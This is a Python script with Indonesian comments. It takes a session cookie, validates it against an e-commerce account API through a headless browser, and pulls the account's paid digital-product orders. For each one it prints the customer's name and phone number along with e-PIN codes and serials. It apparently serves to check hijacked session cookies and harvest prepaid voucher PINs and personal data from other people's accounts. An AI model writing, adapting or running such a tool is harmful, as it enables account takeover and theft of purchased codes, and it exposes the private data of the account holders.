# -*- coding: utf-8 -*-
"""Uji 1 cookie: probe valid + tarik DETAIL order PAID (TANPA VA).

PAID order = read-only -> order/v2/detail. VA cuma utk UNPAID.
Pakai: /root/sniffenv/bin/python test_cookie_paid.py "<cookie string>"
"""
import sys, json, time
from v2 import BrowserAPI

COOKIE = sys.argv[1] if len(sys.argv) > 1 else ""
if not COOKIE:
    print("usage: test_cookie_paid.py \"<cookie>\""); sys.exit(1)

b = BrowserAPI(cookies_str=COOKIE)
if not b.init_success:
    print("[!] browser init gagal (proxy/internet)"); sys.exit(1)

JS = """async (a) => {
    try {
        let csrf='';
        const m=document.cookie.match(new RegExp('(^| )csrftoken=([^;]+)'));
        if(m) csrf=m[2];
        const r=await fetch(a.url,{method:a.method||'GET',
            headers:{'Content-Type':'application/json','Accept':'application/json','x-api-source':'pc','x-csrftoken':csrf},
            credentials:'include', body:a.body?JSON.stringify(a.body):undefined});
        return {s:r.status, b:await r.text()};
    } catch(e){ return {s:0, b:String(e)}; }
}"""
def ev(url, method="GET", body=None):
    r = b.page.evaluate(JS, {"url": url, "method": method, "body": body})
    try: return json.loads(r["b"])
    except Exception: return {"err_code":-1, "_raw": r["b"][:200], "_http": r["s"]}

ai = ev("/api/v4/account/basic/get_account_info")
if ai.get("error") != 0:
    print(f"[!] cookie TIDAK valid - error={ai.get('error')}"); b.close(); sys.exit(2)
inner = ai.get("data") or {}
print(f"[+] VALID username={inner.get('username')} userid={inner.get('userid')}")

PAID = lambda o: (o.get("payment_status") in ("P2","P5")) or (o.get("order_status") not in ("OR1",None,""))
all_o, seen = [], set()
for q in (44, 55, 11):
    j = ev(f"/digital-product/api/order/v2/list?page=1&categories=&order_status={q}&page_size=40&last_create_time=0")
    L = (j.get("data") or {}).get("list") or []
    print(f"    list order_status={q} -> err={j.get('err_code')} n={len(L)}")
    for o in L:
        oid = str(o.get("order_id") or o.get("pay_order_id") or "")
        if oid in seen: continue
        seen.add(oid); all_o.append(o)
    time.sleep(0.3)

paid = [o for o in all_o if PAID(o)]
print(f"[*] total order={len(all_o)}  PAID={len(paid)}\n")
for o in (paid or all_o)[:5]:
    oid = o.get("order_id") or o.get("pay_order_id")
    j = ev(f"/digital-product/api/order/v2/detail?order_id={oid}")
    if j.get("err_code") != 0:
        print(f"  ! detail {oid} -> err={j.get('err_code')}"); continue
    od = (j.get("data") or {}).get("order") or (j.get("data") or {})
    it = (od.get("items") or [{}])[0]
    print("="*62)
    print(f"  order_id     : {od.get('order_id')}")
    print(f"  item         : {od.get('item_name') or it.get('name')}  denom={it.get('denomination')}")
    print(f"  category_id  : {od.get('category_id')}  carrier={od.get('carrier_id')}")
    print(f"  order_status : {od.get('order_status')}   payment_status={od.get('payment_status')}  show={od.get('order_showstatus')}")
    print(f"  customer     : {od.get('customer_name')}  id={od.get('customer_id')}  phone={od.get('phone_number')}")
    print(f"  total_amount : {od.get('total_amount')}  final_price={od.get('final_price')}")
    print(f"  EPIN PIN     : {od.get('epin_pin')}")
    print(f"  epin_serial  : {od.get('epin_serial')}")
    print(f"  cancel_time  : {od.get('cancel_time')}")
    time.sleep(0.3)
b.close()
print("\n[+] done (paid detail - NO VA)")
